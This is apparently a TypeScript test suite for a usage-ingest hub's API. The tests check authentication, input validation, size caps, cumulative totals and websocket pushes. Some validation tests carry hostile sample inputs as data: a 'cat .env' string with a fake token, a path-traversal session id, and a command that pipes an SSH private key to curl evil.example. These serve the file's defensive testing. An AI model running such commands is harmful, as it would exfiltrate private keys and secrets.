// POST /ingest/usage and GET /api/usage (18 §5 U2). Fake secrets are assembled at runtime.
import type { Database } from "bun:sqlite";
import { beforeEach, describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
	dayMinus,
	USAGE_MAX_BODY_BYTES,
	USAGE_MAX_ROWS,
	type UsageRow,
	type UsageSummary,
	UsageSummary as UsageSummarySchema,
} from "@agent-city/schema";
import { openDb } from "./db.ts";
import { createApp, startHub } from "./index.ts";
import { type BroadcastKind, createWebsocket } from "./routes/ws.ts";
import { usageSummary } from "./store.ts";

const TOKEN = "test-ingest-token";
const FAKE_GH = `ghp_${"k".repeat(36)}`;
// 2026-11-13 20:00 AEDT
const NOW = Date.parse("2026-11-13T09:00:00Z");

interface Ctx {
	db: Database;
	app: ReturnType<typeof createApp>;
	published: { kind: BroadcastKind; data: unknown }[];
	clock: { now: number };
}

function setup(): Ctx {
	const db = openDb(":memory:");
	const published: Ctx["published"] = [];
	const clock = { now: NOW };
	const app = createApp({
		db,
		ingestToken: TOKEN,
		publish: (kind, data) => published.push({ kind, data }),
		now: () => new Date(clock.now),
	});
	return { db, app, published, clock };
}

const row = (over: Partial<UsageRow> = {}): UsageRow => ({
	session_id: "claude:s1",
	day: "2026-11-13",
	model: "claude-opus-5-5",
	tool: "claude",
	project: "acme/widget",
	input_tokens: 10,
	output_tokens: 20,
	cache_read_tokens: 300,
	cache_write_tokens: 40,
	messages: 2,
	...over,
});
const report = (rows: unknown[], limits: unknown[] = [], over = {}) => ({
	schema: 1,
	machine_id: "cockpit",
	rows,
	limits,
	...over,
});
const limit = (over = {}) => ({
	tool: "codex",
	limit_id: "codex",
	window_minutes: 10080,
	used_percent: 48,
	resets_at: "2026-11-18T06:53:39.000Z",
	plan_type: "prolite",
	observed_at: "2026-11-13T07:01:01.000Z",
	...over,
});

const post = async (
	ctx: Ctx,
	body: unknown,
	auth: string | null = `Bearer ${TOKEN}`,
) => {
	const headers: Record<string, string> = {
		"content-type": "application/json",
	};
	if (auth !== null) headers.authorization = auth;
	return ctx.app.request("/ingest/usage", {
		method: "POST",
		headers,
		body: typeof body === "string" ? body : JSON.stringify(body),
	});
};
const summary = async (ctx: Ctx, q = ""): Promise<UsageSummary> => {
	const res = await ctx.app.request(`/api/usage${q}`);
	expect(res.status).toBe(200);
	return UsageSummarySchema.parse(await res.json());
};
const usageCount = (ctx: Ctx) =>
	ctx.db.query<{ n: number }, []>("SELECT count(*) AS n FROM usage").get()?.n;

let ctx: Ctx;
beforeEach(() => {
	ctx = setup();
});

describe("migration 8", () => {
	test("user_version 8; usage and usage_limits have no text, command or path column", () => {
		expect(
			ctx.db.query<{ user_version: number }, []>("PRAGMA user_version").get()
				?.user_version,
		).toBe(8);
		const cols = (t: string) =>
			ctx.db
				.query<{ name: string }, []>(
					`SELECT name FROM pragma_table_info('${t}')`,
				)
				.all()
				.map((r) => r.name);
		expect(cols("usage")).toEqual([
			"session_id",
			"day",
			"model",
			"tool",
			"project",
			"machine_id",
			"input_tokens",
			"output_tokens",
			"cache_read_tokens",
			"cache_write_tokens",
			"messages",
			"updated_at",
		]);
		expect(cols("usage_limits")).toEqual([
			"machine_id",
			"tool",
			"limit_id",
			"window_minutes",
			"used_percent",
			"resets_at",
			"plan_type",
			"observed_at",
			"received_at",
		]);
	});
});

describe("POST /ingest/usage — auth, shape, size", () => {
	test("no token → 401; wrong token → 401", async () => {
		expect((await post(ctx, report([row()]), null)).status).toBe(401);
		expect((await post(ctx, report([row()]), "Bearer nope")).status).toBe(401);
	});

	test("unknown keys, text fields and bad values are refused without echoing them", async () => {
		const bad = [
			report([{ ...row(), summary: `cat .env ${FAKE_GH}` }]),
			report([{ ...row(), cwd: "/Users/someone/x" }]),
			report([row()], [], { [FAKE_GH]: 1 }),
			report([row({ model: `has space ${FAKE_GH}` })]),
			report([row({ session_id: "claude:../../etc" })]),
			report([row({ session_id: "ollama:x" })]),
			report([row({ day: "13/11/2026" })]),
			report([row({ input_tokens: -1 })]),
			report([row({ output_tokens: 1.5 })]),
			report([row()], [{ ...limit(), credits: { balance: "12.34" } }]),
			report([row()], [], { machine_id: "laptop" }),
			report([row()], [], { schema: 2 }),
		];
		for (const b of bad) {
			const res = await post(ctx, b);
			expect(res.status).toBe(400);
			const text = await res.text();
			for (const leak of [FAKE_GH, "cat .env", "/Users/", "12.34", "../"])
				expect(text).not.toContain(leak);
		}
		expect((await post(ctx, "{not json")).status).toBe(400);
		expect(usageCount(ctx)).toBe(0);
	});

	test("a token-shaped model that fits the charset is stored as unknown", async () => {
		await post(ctx, report([row({ model: FAKE_GH })]));
		const s = await summary(ctx);
		expect(s.rows.map((r) => r.model)).toEqual(["unknown"]);
		expect(JSON.stringify(s)).not.toContain(FAKE_GH);
	});

	test(`more than ${USAGE_MAX_ROWS} rows → 400; an oversized body → 413`, async () => {
		const many = Array.from({ length: USAGE_MAX_ROWS + 1 }, (_, i) =>
			row({ session_id: `claude:s${i}` }),
		);
		expect((await post(ctx, report(many))).status).toBe(400);
		const big = report([row()], [], { pad: "x".repeat(300 * 1024) });
		expect((await post(ctx, big)).status).toBe(413);
		expect(usageCount(ctx)).toBe(0);
	});

	test(`the size cap is exact: a body of ${USAGE_MAX_BODY_BYTES} bytes is read, one more → 413 (collectors cut chunks to it)`, async () => {
		const json = JSON.stringify(report([row()]));
		const exact =
			json + " ".repeat(USAGE_MAX_BODY_BYTES - Buffer.byteLength(json));
		expect(Buffer.byteLength(exact)).toBe(USAGE_MAX_BODY_BYTES);
		expect((await post(ctx, exact)).status).toBe(200);
		expect((await post(ctx, `${exact} `)).status).toBe(413);
	});
});

describe("idempotent cumulative upsert", () => {
	test("the same report twice, or an older total, changes nothing; a larger one grows the row", async () => {
		const first = await post(ctx, report([row()]));
		expect(await first.json()).toEqual({
			accepted: 1,
			changed: 1,
			ignored: 0,
			limits: 0,
		});
		const again = await post(ctx, report([row()]));
		expect(await again.json()).toMatchObject({ accepted: 1, changed: 0 });
		const older = await post(
			ctx,
			report([row({ input_tokens: 1, messages: 1 })]),
		);
		expect(await older.json()).toMatchObject({ changed: 0 });
		let s = await summary(ctx);
		expect(s.rows).toEqual([
			{
				day: "2026-11-13",
				project: "acme/widget",
				tool: "claude",
				model: "claude-opus-5-5",
				input_tokens: 10,
				output_tokens: 20,
				cache_read_tokens: 300,
				cache_write_tokens: 40,
				messages: 2,
				sessions: 1,
			},
		]);
		expect(s.updated_at).toBe(new Date(NOW).toISOString());
		await post(ctx, report([row({ output_tokens: 25, messages: 3 })]));
		s = await summary(ctx);
		expect(s.rows[0]).toMatchObject({
			input_tokens: 10,
			output_tokens: 25,
			messages: 3,
		});
		// a usage push only when something changed
		expect(ctx.published.filter((p) => p.kind === "usage")).toHaveLength(2);
		const pushed = ctx.published.at(-1)?.data;
		expect(UsageSummarySchema.parse(pushed).rows[0]?.output_tokens).toBe(25);
	});

	test("sums per (day, project, tool, model) over sessions; project case variants fold", async () => {
		ctx.db.run(
			"INSERT INTO repos (id, district, is_local_only) VALUES ('Acme/Widget', 'x', 0)",
		);
		await post(
			ctx,
			report([
				row({ session_id: "claude:a", project: "acme/widget" }),
				row({ session_id: "claude:b", project: "ACME/widget" }),
				row({ session_id: "claude:c", project: null }),
				row({
					session_id: "codex:d",
					tool: "codex",
					model: "gpt-6-astra",
					day: "2026-11-12",
				}),
			]),
		);
		const s = await summary(ctx);
		expect(s.today).toBe("2026-11-13");
		expect(s.days).toEqual([
			"2026-11-07",
			"2026-11-08",
			"2026-11-09",
			"2026-11-10",
			"2026-11-11",
			"2026-11-12",
			"2026-11-13",
		]);
		expect(
			s.rows.map((r) => [r.day, r.project, r.tool, r.sessions, r.input_tokens]),
		).toEqual([
			["2026-11-12", "Acme/Widget", "codex", 1, 10],
			["2026-11-13", "Acme/Widget", "claude", 2, 20],
			["2026-11-13", null, "claude", 1, 10],
		]);
	});

	test("future and impossible days are ignored, old days are kept; the Sydney day rolls at local midnight", async () => {
		const res = await post(
			ctx,
			report([
				row({ session_id: "claude:old", day: "2026-09-01" }),
				row({ session_id: "claude:future", day: "2026-11-20" }),
				row({ session_id: "claude:feb30", day: "2026-02-30" }),
				row({ session_id: "claude:ancient", day: "2024-12-31" }),
				row({ session_id: "claude:ok", day: "2026-11-14" }),
			]),
		);
		expect(await res.json()).toMatchObject({ accepted: 2, ignored: 3 });
		expect((await summary(ctx)).rows).toEqual([]); // 11-14 is tomorrow in Sydney
		ctx.clock.now = Date.parse("2026-11-13T13:00:00Z"); // 00:00 AEDT 11-14
		const s = await summary(ctx);
		expect(s.today).toBe("2026-11-14");
		expect(s.rows).toHaveLength(1);
	});

	test("?days bounds", async () => {
		expect((await summary(ctx, "?days=1")).days).toEqual(["2026-11-13"]);
		expect((await summary(ctx, "?days=31")).days).toHaveLength(31);
		for (const q of ["?days=0", "?days=32", "?days=x", "?days=1.5"])
			expect((await ctx.app.request(`/api/usage${q}`)).status).toBe(400);
	});

	test("an empty hub answers an empty summary", async () => {
		const s = await summary(ctx);
		expect(s).toMatchObject({ rows: [], limits: [], updated_at: null });
	});
});

describe("limits", () => {
	test("as stated; the newest observation wins even when it is lower; a far-future clock is dropped", async () => {
		await post(ctx, report([], [limit()]));
		await post(
			ctx,
			report(
				[],
				[limit({ used_percent: 3, observed_at: "2026-11-13T08:00:00Z" })],
			),
		);
		await post(
			ctx,
			report(
				[],
				[limit({ used_percent: 90, observed_at: "2026-11-13T07:30:00Z" })],
			),
		);
		await post(
			ctx,
			report(
				[],
				[limit({ used_percent: 99, observed_at: "2027-01-01T00:00:00Z" })],
			),
		);
		const s = await summary(ctx);
		expect(s.limits).toEqual([
			{
				machine_id: "cockpit",
				tool: "codex",
				limit_id: "codex",
				window_minutes: 10080,
				used_percent: 3,
				resets_at: "2026-11-18T06:53:39.000Z",
				plan_type: "prolite",
				observed_at: "2026-11-13T08:00:00.000Z",
				received_at: new Date(NOW).toISOString(),
			},
		]);
	});

	test("across machines the newest observation is the one shown", async () => {
		await post(ctx, report([], [limit({ used_percent: 10 })]));
		await post(
			ctx,
			report(
				[],
				[limit({ used_percent: 20, observed_at: "2026-11-13T08:30:00Z" })],
				{ machine_id: "forge" },
			),
		);
		const s = await summary(ctx);
		expect(s.limits.map((l) => [l.machine_id, l.used_percent])).toEqual([
			["forge", 20],
		]);
	});
});

describe("/ws greeting", () => {
	const firstMessage = (url: string) =>
		new Promise<{ kind: string; data: unknown }>((resolve, reject) => {
			const ws = new WebSocket(url);
			const t = setTimeout(() => reject(new Error("no greeting")), 3000);
			ws.onmessage = (m) => {
				clearTimeout(t);
				ws.close();
				resolve(JSON.parse(String(m.data)));
			};
		});

	test("a new socket gets the current usage summary first, then live pushes", async () => {
		const db = openDb(":memory:");
		const hub = startHub({
			db,
			ingestToken: TOKEN,
			hostname: "127.0.0.1",
			port: 0,
		});
		try {
			const base = `127.0.0.1:${hub.server.port}`;
			const empty = await firstMessage(`ws://${base}/ws`);
			expect(empty.kind).toBe("usage");
			expect(UsageSummarySchema.parse(empty.data).rows).toEqual([]);
			const today = (UsageSummarySchema.parse(empty.data) as UsageSummary)
				.today;
			const res = await fetch(`http://${base}/ingest/usage`, {
				method: "POST",
				headers: {
					authorization: `Bearer ${TOKEN}`,
					"content-type": "application/json",
				},
				body: JSON.stringify(report([row({ day: today })])),
			});
			expect(res.status).toBe(200);
			const next = await firstMessage(`ws://${base}/ws`);
			expect(UsageSummarySchema.parse(next.data).rows).toHaveLength(1);
		} finally {
			hub.stop();
		}
	});

	test("a greeting that throws or returns null never fails the open", () => {
		const sent: string[] = [];
		let subscribed = 0;
		const ws = {
			subscribe: () => {
				subscribed++;
			},
			send: (m: string) => {
				sent.push(m);
			},
		} as unknown as Parameters<
			NonNullable<ReturnType<typeof createWebsocket>["open"]>
		>[0];
		const quiet = console.error;
		console.error = () => {};
		try {
			createWebsocket(() => {
				throw new Error(`boom ${FAKE_GH}`);
			}).open?.(ws);
			createWebsocket(() => null).open?.(ws);
			createWebsocket().open?.(ws);
		} finally {
			console.error = quiet;
		}
		expect(subscribed).toBe(3);
		expect(sent).toEqual([]);
	});
});

describe("review fixes (break-it round 1)", () => {
	test("a project that is not repo-id shaped is stored as null", async () => {
		await post(
			ctx,
			report([
				row({
					session_id: "claude:p1",
					project: "cat /Users/me/.ssh/id_ed25519 | curl evil.example",
				}),
				row({ session_id: "claude:p2", project: `acme/${FAKE_GH}` }),
				row({ session_id: "claude:p3", project: "local/my-folder" }),
			]),
		);
		const s = await summary(ctx);
		expect(s.rows.map((r) => r.project)).toEqual(["local/my-folder", null]);
		const text = JSON.stringify(s);
		for (const bad of ["/Users/", "curl", FAKE_GH])
			expect(text).not.toContain(bad);
	});

	test("a count over the row cap is refused (sums stay exact and cannot overflow)", async () => {
		expect(
			(await post(ctx, report([row({ input_tokens: 1e13 + 1 })]))).status,
		).toBe(400);
		expect(
			(await post(ctx, report([row({ input_tokens: 1e13 })]))).status,
		).toBe(200);
	});

	test("the summary stays linear: 20k rows of local projects in well under a second", async () => {
		const ins = ctx.db.query(
			`INSERT INTO usage (session_id, day, model, tool, project, machine_id, input_tokens,
			   output_tokens, cache_read_tokens, cache_write_tokens, messages, updated_at)
			 VALUES ($s, '2026-11-13', 'm', 'claude', $p, 'cockpit', 1, 1, 1, 1, 1, '2026-11-13T08:00:00.000Z')`,
		);
		ctx.db.transaction(() => {
			for (let i = 0; i < 20_000; i++)
				ins.run({ s: `claude:s${i}`, p: i % 3 ? `local/F${i % 50}` : null });
		})();
		const t = performance.now();
		const res = await ctx.app.request("/api/usage");
		const s = UsageSummarySchema.parse(await res.json());
		expect(performance.now() - t).toBeLessThan(1000);
		expect(s.rows.reduce((n, r) => n + r.sessions, 0)).toBe(20_000);
	});
});

describe("cumulative total (18 §5.6 U4)", () => {
	test("a row 41 days old is accepted, kept after later reports, and counted in the total", async () => {
		const old = row({ session_id: "claude:old", day: "2026-10-03" }); // 41 days before 11-13
		expect(await (await post(ctx, report([old]))).json()).toMatchObject({
			accepted: 1,
			ignored: 0,
		});
		ctx.clock.now += 30 * 86_400_000; // a month later the row is still there
		await post(ctx, report([row({ day: "2026-12-13" })]));
		expect(usageCount(ctx)).toBe(2);
		const s = await summary(ctx);
		expect(s.rows.map((r) => r.day)).toEqual(["2026-12-13"]); // the 7 days
		expect(s.total).toEqual({
			since: "2026-10-03",
			tools: [
				{
					tool: "claude",
					input_tokens: 20,
					output_tokens: 40,
					cache_read_tokens: 600,
					cache_write_tokens: 80,
					messages: 4,
				},
			],
		});
	});

	test("per tool; re-sending the same or older totals leaves the total unchanged", async () => {
		const rows = [
			row({ day: "2026-10-01" }),
			row({ day: "2026-11-13" }),
			row({
				session_id: "codex:c1",
				tool: "codex",
				model: "gpt-6-astra",
				day: "2026-11-12",
				input_tokens: 5,
			}),
		];
		await post(ctx, report(rows));
		const first = (await summary(ctx)).total;
		expect(first?.since).toBe("2026-10-01");
		expect(first?.tools.map((t) => [t.tool, t.input_tokens])).toEqual([
			["claude", 20],
			["codex", 5],
		]);
		ctx.published.length = 0;
		await post(ctx, report(rows));
		await post(ctx, report(rows.map((r) => ({ ...r, input_tokens: 1 }))));
		expect((await summary(ctx)).total).toEqual(first);
		expect(ctx.published).toHaveLength(0); // nothing changed → nothing pushed
	});

	test("GET /api/usage and the /ws push carry the same total; an empty hub has since null", async () => {
		expect((await summary(ctx)).total).toEqual({ since: null, tools: [] });
		await post(ctx, report([row({ day: "2026-10-20" })]));
		const pushed = ctx.published.at(-1);
		expect(pushed?.kind).toBe("usage");
		expect((pushed?.data as UsageSummary | undefined)?.total).toEqual(
			(await summary(ctx)).total,
		);
	});

	test("usage_total equals a full scan after new, repeated, grown, older and deleted rows", async () => {
		const scan = () =>
			ctx.db
				.query<Record<string, number | string>, []>(
					`SELECT tool, total(input_tokens) AS input_tokens, total(output_tokens) AS output_tokens,
					   total(cache_read_tokens) AS cache_read_tokens,
					   total(cache_write_tokens) AS cache_write_tokens, total(messages) AS messages
					 FROM usage GROUP BY tool ORDER BY tool`,
				)
				.all();
		const codex = (over: Partial<UsageRow> = {}) =>
			row({
				session_id: "codex:c1",
				tool: "codex",
				model: "gpt-6-astra",
				...over,
			});
		await post(ctx, report([row(), codex(), row({ day: "2026-10-01" })]));
		await post(ctx, report([row(), codex()])); // repeat
		await post(
			ctx,
			report([row({ output_tokens: 99 }), codex({ messages: 1 })]),
		); // one grows, one older
		await post(
			ctx,
			report([row({ session_id: "claude:s2", cache_read_tokens: 7 })]),
		);
		ctx.db.run("DELETE FROM usage WHERE day = '2026-10-01'"); // no code path deletes; the trigger still keeps step
		const t = (await summary(ctx)).total;
		expect(t?.tools).toEqual(scan() as never);
		expect(t?.since).toBe("2026-11-13");
		expect(t?.tools.map((x) => [x.tool, x.output_tokens])).toEqual([
			["claude", 119],
			["codex", 20],
		]);
	});

	test("the summary (with the all-time total) over 200k rows stays fast", async () => {
		const dir = mkdtempSync(join(tmpdir(), "usage-200k-"));
		const db = openDb(join(dir, "hub.db"));
		try {
			const ins = db.query(
				`INSERT INTO usage (session_id, day, model, tool, project, machine_id, input_tokens,
				   output_tokens, cache_read_tokens, cache_write_tokens, messages, updated_at)
				 VALUES ($s, $d, $m, $t, $p, 'cockpit', 11, 22, 333, 44, 2, '2026-11-13T08:00:00.000Z')`,
			);
			db.transaction(() => {
				for (let i = 0; i < 200_000; i++)
					ins.run({
						s: `${i % 4 ? "claude" : "codex"}:s${i}`,
						d: dayMinus("2026-11-13", i % 400),
						m: `m${i % 5}`,
						t: i % 4 ? "claude" : "codex",
						p: i % 3 ? `local/F${i % 50}` : null,
					});
			})();
			const times: number[] = [];
			let s: UsageSummary | null = null;
			for (let k = 0; k < 5; k++) {
				const t = performance.now();
				s = usageSummary(db, new Date(NOW));
				times.push(performance.now() - t);
			}
			times.sort((a, b) => a - b);
			const median = times[2] ?? Number.NaN;
			console.log(
				`[usage] summary over 200k rows: median ${median.toFixed(1)} ms`,
			);
			expect(median).toBeLessThan(50); // 18 §5.6: 50 ms at 200k rows (measured ~2.6 ms)
			expect(s?.total?.since).toBe(dayMinus("2026-11-13", 399));
			expect(s?.total?.tools.map((t) => [t.tool, t.messages])).toEqual([
				["claude", 300_000],
				["codex", 100_000],
			]);
		} finally {
			db.close();
			rmSync(dir, { recursive: true, force: true });
		}
	});
});
